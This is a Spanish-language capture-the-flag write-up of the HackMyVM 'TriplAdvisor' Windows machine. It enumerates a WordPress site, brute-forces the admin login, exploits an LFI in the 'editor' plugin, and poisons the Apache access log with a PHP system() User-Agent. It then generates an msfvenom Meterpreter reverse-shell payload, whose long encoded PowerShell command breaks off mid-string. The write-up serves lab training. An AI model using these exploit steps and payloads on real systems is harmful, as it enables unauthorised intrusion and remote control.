---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# TriplAdvisor HackMyVM (Easy - Windows)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-29 06:50 EDT
Nmap scan report for 192.168.1.158
Host is up (0.00057s latency).

PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp open  http          Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://tripladvisor:8080/wordpress/
|_http-open-proxy: Proxy might be redirecting requests
MAC Address: 08:00:27:A3:DB:30 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-29T19:51:03
|_  start_date: 2025-03-29T19:46:48
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: 8h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.50 seconds
```

Vemos que hay un servidor `SMB` y un puerto `8080` en el que puede contener una pagina web, si entramos por el puerto `8080` nos redirije automaticamente a un `dominio` por lo que tendremos que añadirlo en nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>              tripladvisor
```

Una vez echo eso, volveremos a cargar la pagina:

```
URL = http://tripladvisor:8080/wordpress/
```

Vemos lo que parece ser una pagina normal pero que esta en un `wordpress` por lo que vamos a intentar enumerar si tuviera algunas credenciales o algun `plugin` vulnerable.

## wpscan

```shell
wpscan --url http://tripladvisor:8080/wordpress/ --enumerate u
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://tripladvisor:8080/wordpress/ [192.168.1.158]
[+] Started: Sat Mar 29 06:54:48 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://tripladvisor:8080/wordpress/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://tripladvisor:8080/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://tripladvisor:8080/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://tripladvisor:8080/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.19 identified (Outdated, released on 2024-06-24).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://tripladvisor:8080/wordpress/, Match: '-release.min.js?ver=5.1.19'
 | Confirmed By: Most Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-includes/css/dist/block-library/style.min.css?ver=5.1.19
 |  - http://tripladvisor:8080/wordpress/wp-includes/js/wp-embed.min.js?ver=5.1.19

[+] WordPress theme in use: expert-adventure-guide
 | Location: http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/
 | Last Updated: 2025-03-23T00:00:00.000Z
 | Readme: http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/readme.txt
 | [!] The version is out of date, the latest version is 2.1
 | Style URL: http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/style.css?ver=5.1.19
 | Style Name: Expert Adventure Guide
 | Style URI: https://www.seothemesexpert.com/wordpress/free-adventure-wordpress-theme/
 | Description: Expert Adventure Guide is a specialized and user-friendly design crafted for professional adventure ...
 | Author: drakearthur
 | Author URI: https://www.seothemesexpert.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/style.css?ver=5.1.19, Match: 'Version: 1.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:15 <===============================================================================> (10 / 10) 100.00% Time: 00:00:15

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://tripladvisor:8080/wordpress/wp-json/wp/v2/users/?per_page=100&page=1
 |  Oembed API - Author URL (Aggressive Detection)
 |   - http://tripladvisor:8080/wordpress/wp-json/oembed/1.0/embed?url=http://tripladvisor:8080/wordpress/&format=json
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Mar 29 06:55:39 2025
[+] Requests Done: 63
[+] Cached Requests: 7
[+] Data Sent: 18.379 KB
[+] Data Received: 3.334 MB
[+] Memory used: 243.348 MB
[+] Elapsed time: 00:00:51
```

Vemos que nos saca un usuario llamado `admin` por lo que vamos a intentar realizar `fuerza bruta` sobre dicho usuario con la misma herramienta:

```shell
wpscan --url http://tripladvisor:8080/wordpress/ --usernames admin --passwords <WORDLIST>
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://tripladvisor:8080/wordpress/ [192.168.1.158]
[+] Started: Sat Mar 29 06:57:47 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://tripladvisor:8080/wordpress/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://tripladvisor:8080/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://tripladvisor:8080/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://tripladvisor:8080/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.19 identified (Outdated, released on 2024-06-24).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://tripladvisor:8080/wordpress/, Match: '-release.min.js?ver=5.1.19'
 | Confirmed By: Most Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-includes/css/dist/block-library/style.min.css?ver=5.1.19
 |  - http://tripladvisor:8080/wordpress/wp-includes/js/wp-embed.min.js?ver=5.1.19

[+] WordPress theme in use: expert-adventure-guide
 | Location: http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/
 | Last Updated: 2025-03-23T00:00:00.000Z
 | Readme: http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/readme.txt
 | [!] The version is out of date, the latest version is 2.1
 | Style URL: http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/style.css?ver=5.1.19
 | Style Name: Expert Adventure Guide
 | Style URI: https://www.seothemesexpert.com/wordpress/free-adventure-wordpress-theme/
 | Description: Expert Adventure Guide is a specialized and user-friendly design crafted for professional adventure ...
 | Author: drakearthur
 | Author URI: https://www.seothemesexpert.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/style.css?ver=5.1.19, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] editor
 | Location: http://tripladvisor:8080/wordpress/wp-content/plugins/editor/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-content/plugins/editor/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-content/plugins/editor/readme.txt
 
[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:01:36 <============================================                           
```

Si hacemos esto veremos que al final no nos saca nada, pero si vemos que detecto un `plugin` llamado `editor` el cual suele ser vulnerable y es de version `1.1` por lo que vamos a investigar si tuviera algun exploit asociado.

URL = [Exploit Plugin Editor Wordpress v1.1.1](https://www.exploit-db.com/exploits/44340)

Por lo que vemos si tiene una vulnerabilidad que es la de un `LFI` y nos muestra la ruta vulnerable que seria en nuestro caso la siguiente:

```
URL = http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/Users/Public/desktop.ini
```

> NOTA:

Tuve que cambiar `site-editor` por `editor` ya que el `plugin` la ruta le cambiaron el nombre, si probamos con el `payload` normal no ira, por lo que tendremos que dejarlo en `editor`.

Info:

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Vemos que funciona, pero vamos a realizar un poco de `fuzzing` para ver cuales rutas son accesibles y cuales no.

### FFUF

URL = [Wordlist LFI Windows](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt)

```shell
ffuf -u 'http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=FUZZ' -w <WORDLIST> -fs 72
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=FUZZ
 :: Wordlist         : FUZZ: /home/kali/Desktop/LFI-gracefulsecurity-windows.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 72
________________________________________________

C:/WINDOWS/System32/drivers/etc/hosts [Status: 200, Size: 861, Words: 172, Lines: 22, Duration: 1ms]
C:/Windows/win.ini      [Status: 200, Size: 129, Words: 6, Lines: 8, Duration: 1ms]
C:/xampp/apache/logs/access.log [Status: 200, Size: 501044, Words: 30299, Lines: 1962, Duration: 2ms]
C:/xampp/apache/logs/error.log [Status: 200, Size: 5740395, Words: 683487, Lines: 33721, Duration: 25ms]
c:/xampp/apache/logs/access.log [Status: 200, Size: 537071, Words: 32504, Lines: 2101, Duration: 19ms]
c:/xampp/apache/conf/httpd.conf [Status: 200, Size: 21507, Words: 2670, Lines: 565, Duration: 40ms]
c:/xampp/phpMyAdmin/config.inc.php [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 42ms]
c:/xampp/php/php.ini    [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 44ms]
c:/xampp/sendmail/sendmail.ini [Status: 200, Size: 2133, Words: 288, Lines: 73, Duration: 46ms]
c:/WINDOWS/system32/drivers/etc/protocol [Status: 200, Size: 1395, Words: 445, Lines: 28, Duration: 28ms]
c:/WINDOWS/system32/drivers/etc/lmhosts.sam [Status: 200, Size: 3720, Words: 628, Lines: 80, Duration: 29ms]
c:/WINDOWS/setupact.log [Status: 200, Size: 14543, Words: 1490, Lines: 177, Duration: 25ms]
c:/WINDOWS/system32/drivers/etc/services [Status: 200, Size: 17500, Words: 8431, Lines: 286, Duration: 27ms]
c:/WINDOWS/system32/drivers/etc/hosts [Status: 200, Size: 861, Words: 172, Lines: 22, Duration: 33ms]
c:/WINDOWS/system32/drivers/etc/networks [Status: 200, Size: 444, Words: 88, Lines: 17, Duration: 33ms]
c:/WINDOWS/setuperr.log [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 25ms]
c:/WINDOWS/WindowsUpdate.log [Status: 200, Size: 224119, Words: 18179, Lines: 2768, Duration: 21ms]
c:/xampp/apache/logs/error.log [Status: 200, Size: 5740395, Words: 683487, Lines: 33721, Duration: 80ms]
:: Progress: [236/236] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Vemos varias rutas interesantes pero entre ellas se puede entrar en:

```
c:/xampp/apache/logs/access.log
```

Por lo que puedo deducir que se podra realizar lo llamado `LOG POISONING`, vamos a probar a realizar dicha tecnica.

```shell
curl -A "<?php system('dir'); ?>" http://tripladvisor:8080/wordpress
```

Vamos a probar a ver los archivos del directorio actual realizando un comando `dir`, ahora si recargamos de nuevo la `URL` y bajamos abajo del todo veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vamos a subirnos a generarnos una `reverse shell` con `metasploit` para tener un `meterpreter` por lo que tendremos que generar el `payload` de la siguiente forma:

## Escalate user websvc

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_ATTACKER> LPORT=<PORT> -f psh-cmd -o payload.txt
```

Ahora si leemos el `payload.txt` veremos lo siguiente:

```
%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAoACgAJwAnAEgANABzAEkAQQBEAEwAaQA1ADIAYwBDAEEANwBWAFgANwBXAHsAMAB9AGkAUwBCAHsAMQB9AC8AdgBzAG4AewAwAH0ARAAyAFIAewAxAH0ASQBxAFoAVwBzAEwAVgBkAHIAOABrAG0AQgA0ACcAJwArACcAJwBnAFYAcQAxADAAcABpAGwAWABYAFgAQwBnAE0ATQBHAFUAWQBYAEIAaQBxAGQAbQAvAC8AOQAzAHMARwB0AEMAOQBwAHUAOQBlADcAWgBPAGMATAB6AHMAegB6AE4AcgAvAG4AVgBUAHsAMAB9AG4ATABzAE0ASgBGAFcANwBhAEYAMABmAEMAewAxAH0ANAA4AGYAaABOADAAYQBPAGEAawBUAEMAMgBJAEYAdABlAHkANgBVAEkAbAB2AGEANAA5AFgAbABWAGcAVgB2AGcAewAxAH0AaQBRAGwAbQB0AE8AawBuAHMAWQBMAG8AOABPADkAUAB5AE4ARQBXAFUAbABmAHYARwBPAFcASgBLAGwAcQBIADQAaABtAEMAVQBpAFQAWABoAGIAMgBFAGEAbwBoAFEAZABmAHIAMgA1AFIAUwA0AFQAZgBnAGkAVgB2AHgAcgBuAEoATABsAHgAeQBJADUAcwBxAHoAbAB1AGkASQBSAEQAaABYAHIAOABiAHAAQwA0AEQAcgBlAHEAWQBhADAASQBaAG0ATAAxADIANwBkAHEAYgBYAEgAWQBYAEQAYgAwADcANwBsAEQATQByAEYAcQBiAFQATwBHADQAbwBaAEgAUwBMAFUAbQAvAEsAeAB4AGgAZQBQAHQAJwAnACsAJwAnAEMAbwBuAFYASQBYAGIAVABKAEUAdAA4ADEAcABoAGkAZQBuAHoAVQBtAE4ARABNADgAZABFAGwAUwBMAHQARABRADgAVABDAHgATQB1AHEAOABKAFQASAB4ADYAUwBJADUAUwBuAGwAYgB7ADAAfQBKAEMAUwBoAEsAeABDAHsAMQB9ADkASABhAGUASQBxAG4AcABlAGkATABLAHYAVwBoAFEAVQBYAHYAMQBnAHUALwB4AFEAWABPADkAMQBYAE8AVwBVADQAUgBnADIARABNAHAAUQBtAEsAdwB1AGwAZAA5AGgARgBXAGEAUABuAFUASQB7ADAAfQBnAEsAewAwAH0AUQB2AGcAYwB0AGkASwBhAGIAQgBzAGwAWQBEAHMAcgBzAGsAUQBtAEsARgAnACcAKwAnACcANQBvAFQAVQBoAGYAOABpAFIAcgB4AEUANgB6ADEAeQA3ADIAVQBTAG4AegBJAEIAMQBZAGkAbAB0AFQAcAA0ADgAOABVAHIAaAA0AG0AWABFADEAVAAnACcAKwAnACcAeQBWAFYAOAB4AGsALwB1AC8AQgBxAHUATQBBAFUARAB1AEoAdwBmAFAAMwAwAGYATgB5AGgAdQAzADEANgB7ADAAfQAnACcAKwAnACcARQB6AGUAUABCAGYAaQAyAEsARwB3AFQAMgBpAHEATQBrAHcAdwBYADMARgAwAEcAdQBDADAAUABRADcAYgBBAGsAMwBjAEsAMgBNAGsANQB6AFYARgBzAHsAMAB9AG8AQwAnACcAKwAnACcAMQBVAC8AJwAnACsAJwAnAE4AbQBKACcAJwArACcAJwBXAFgAewAwAH0AdgB0AE8AYQBlAEYAUgBpAEQAZABOADEAdgB3AHQAbgBDAFQAcgBDADMAZgBKAFQAdwB6AFAAawBWADEATwBNAGsAYgB3AGQAeQBCAC8AbQBZAG8AcwA2AFcATwB7ADEAfQBGADIAOQA3AEUAcQB2AHUAWQBSADUAQgBOAFUAWQBOAEwAWQBrADEAMgBDAGcAVwBKADEAZAA0AEcAOABEAGkASQBvAGMAQgBoAEgAbQBRAGYARwBDAHoAWQA5AHgAdQB5AEIAVgA4ADAAeAA4ACcAJwArACcAJwBWAEMAcQB1AE8ARAAnACcAKwAnACcAVgBEAEsAdwBDAGgAOQBlAGUARwAxAE0ANgBUAHEAdwBhAGQASQBoAGkAUQBLAC8AYwBRADYAUgBXAGYATQBnAFEAdABLAGYAZQBaAGMAVgAyAHIANQAzAHYAZwBhAGkAcQBFAFMAZgBMADYAcwBJAG8AaAB4AFIAMQA2ADQASwBGAEgASQBLADgAdQBxAEQAUQBEAE8AewAwAH0AdQBsAEoAdwBsAHgAYwAvAHEAbwA3AG4ARABuAEQARABzAE8AaABuAGIAJwAnACsAJwAnAGkAMQB2AFcAbgBvAEcANQBVADYAbwBsAE4ARwBOAHAANwBvAEoAWABBAFkAQwB4AHQAVQBJAHUAZABnAHsAMQB9AEgAbwB5ADcAMABzAEkAZgBVAHIAWQBXAEQAdgBmAEwAcQBxADIAaABvAEQAaQBHAFEATwBTAEQAcABEAHIAdwBCAEoAeAB3AEYAaQAvAEYAWQBTAGIAMQA2AEcAUgBlADEAaABvAFcAWQBFAGEAOABJAGkAbwBHAG0ASwBCAGgAZAA0AGcAUgBRAEgAbgBiADUAVQBRAFMAJwAnACsAJwAnAFgARQB5AEMAdgB7ADAAfQBxAHEAWgB7ADAAfQB6AFEAbwBZADUANgB7ADEAfQBzAG8AZgB7ADEAfQBpAFoASABnAGEAbwBzAGsAcgBDADcAWQBPAEcAVgBRAGYARAB7ADEAfQBDAFIAVwB6ADkATAB5AE4AZQAxAGgAMgB3AFIAawB2AFIAegB7ADEAfQBQAGkAUABzAEUAVwA2AHAAYgB4AEIAJwAnACsAJwAnAEsAaQBzAFQAcgBUAFcATwBZAC8AUgBIAFUAUQBGAEkAQwBrAEQATQBMAHAAcABFAHEAdABPAGgAawA1AGIAWgBaAEUAUgBQADAAawA2ADcAcAB5AE0ATwBzAG0AOQBBAGsAdgB2AFgAcABtADIAYQBrADAAbQB3AFUAWQBtAGMAMgBJAFoAegBKAHIAcABlAEQAQQBKAFEAdwBNADMAewAxAH0AYwBCAFMARABvADYAdABhAEgAVQA1AGQASQBtAEIAewAxAH0ALwB1AG0AMQBlAGsAcABhAFcAYwBUAHsAMAB9AG8AcQBSAEcAWABwAFAAMwBaAHAATgBWAFgARgA3AHsAMAB9AEwAUABkAFYAeQBjAFQANABNAFAAYQB3AEwAegBkAEcASQBxAG4AJwAnACsAJwAnAHgAcwBGADEATQBOAFAAVwB4AGkAaQA4AE4AawBDAFIATgBnAGkATQBBAEwANgBxAEUAYgBxAHEAUABKAGMARABWAGUANQBxAEEAMABzAE4AZABTAHcAcgBnAFcAWAAyAHoARgBaAHoAWAB1AGkAUgAyAGsAVABGADkANQBaAGgASwBiADEAcABvAGUAOQBCAHsAMQB9ADkANQBxADkAYQA0ADMAWQB7ADAAfQBWAHkAMgBGAGYAQwA3AGwAZQB2ADIAegB6AHEARgB2AHcAUgA1ADUAOQBIADUANABPAE8AWAB1AHgAZAB2AHsAMQB9AGQAbgBtAFkANQAxADAASwBOADMAWgA2AFkAZABvACcAJwArACcAJwBxAG0AOQBVAHEAZAA2AGQAMgA3AGEASwB5AE0ANABXAEEAZQBtAFAAWgBCAGEAMwBWAEMARgBjAHcATgB2AEIAaQB0AEwAZwB0AFYAcwA5AHUAewAwAH0AbwBkAHoAOABrADcAZgBzAGgAbQBHAHYAYQA4AHoANQBHAGMAeQBOAEEAMgAwAEEAeABGAGMAVwBhAFUAVwBMAGQAcgBEAFYARgBQAFEAbgBYAEYANABFAGEAUgBkADAASgBuAEUAVgB7ADEAfQBnADIANwBNACcAJwArACcAJwBtADkAWABRADIAOAA1ADYAMABoAC8AMgBFAEsATgBWAG8AcABpADYAbwBuAFEASgA1AEcAaQBzAE8ATwB1AE8AMQBKAHcAbQBGADYAWgA5AFkAawA1ADAAZQBiAE8AZAB5AEoAdQAxAGYAaQB1AHQAZABkAHgAZgBSADcAdgB2ADUAUAB6ADAATgBKAEQAOAAxAGsAaQB5AEwAWQBQADIAbgBGAEEARgBlADcAZgA5AFYAbwBUADcAQgAzAEEAWABPADcAWQA4ADgAeQBXAGIANAA2AGQARgBWAEwAcQBuADEAewAwAH0AUwAwAFAAeQB3AHcAaABmAGUAWQB3AEkAUABIADQAMQA3AGYAQwBhADYAQQByAHsAMAB9AFIAUgBHAEQAVwB1AEoAYwBrAE8AcABFAEQAeABpAFcAMABFAGIAVABPACcAJwArACcAJwA0AFQAdQBpAFIARQA0AEgAcwBhAGEAQwBBAGgAZgBCAEcAOABMAFgAZgBOAHcAQgA3AE4AUwBjADQAbQBoAHgAYwBTADgAMABKADIAQwBQAEgALwBZADMATQBiAFkAMwA3AGIAWgBCADMARgBMADAAaQAwAHcAbwBCAFcAMgAvAHUASwBDAHEAMwBRADUAMgBlAEoAOABvADAATwB7ADEAfQAvAFYAdAB1ADMAUgBFAE4ANQBoAE4AMABFAG0AdABmAFAAeAB0AEEAYwB5AHcAZQBZADgAYQBuAE8AWQB3AGIAYwBkAFMANgBQAG4AbABuAEYAOQA1AE4AMQBjAHEAZABLAEIATgAzAE0AQwBkAFcANgA1AHYAdABZAGUAVABMAEYAOQBKADkAbQBmAEkATQBvAFgARQAwAHoAWgA4AGQARwB5AFEAewAxAH0ALwBMAEYANgBlADgARQAzAHoAOABVAEwAbQAnACcAKwAnACcATgBSAGsAOQBDAC8AYQAwAG0ATgAzAFQAUwBMAEgAUQBJAHAAQQAnACcAKwAnACcARAAwAHIAMwAwAGgANgBpAFoAcABkADkAZQBVAFIAZwBuAG0ASABLAEoAWQB7ADEAfQBEAFEAUgBTAGkAawBpAE0AQQBuAEEAcgBMAEQAUABZAFkAVwBRAHgATwBYADkAcwBHAHgAZgAwAEkAegBMAEYAcwBrADcAOQBzAFEAbwA3AEgAcgB0AFYAMAAxADQASQBLAHcAOQB0AHMAcgA5ADAAZABuAFoASABNAHkARQBxAGwAQwBrAGIARwBPAEEAYQBNAEQAQwB1AHIAdwA1AGwAbQBYAG8AYwB2AEoARwBiAGgAWAA1AC8ALwA3ACcAJwArACcAJwBYAGEAYwBsAHEASwA1AGIAUwA2AHIAeABSAGMAbgBnAGUAeABKAE4AQwBQAEUAewAxAH0ARQB2AGkAQwBLAHYAeAA4AHkAbQBJAFkAWQBsAE8AWgBmAGcAUABZAFcAZgBxAEEAOABnAG0ASQBLAHQAYgAyAHMAYwBCAHgARgBOAFUAbgBJAFUAdwB6AEwAcAB6ADMARQB4AEQATQBFAEEAYgBvAG0AdgBIADcAQgBSADYARQB5AFcAawBEAEUASQBmAG8AdQBWAEIAZwBmAEYAcAA0AE8ASAB4AFcAcQAvADkANwA0ADIAVgBYAHEARQBEADcAZQB2ADgAYgBQADQAOQBrAHYAYgB0ADgAVgBVADMASwA5AEEATwB7ADEAfQBGADYAZgBPAEQASgB6ADMAdQBOADAASQB3AGQAVABBAEQAUwBnAHMANgBEAGsASABsAEQAUABRAEcARQByAHUAawBlAFQAcABVADYAcABBAFAALwBtADcAeABmAHcAVgBmAGMAMwBaADQAQwBaAE4AbQAwAGYAJwAnACsAJwAnAFgAewAwAH0AQQBWAEIAVwA0AHkAMgBMAEQAQQBBAEEAJwAnACkALQBmACcAJwArACcAJwAsACcAJwBqACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAu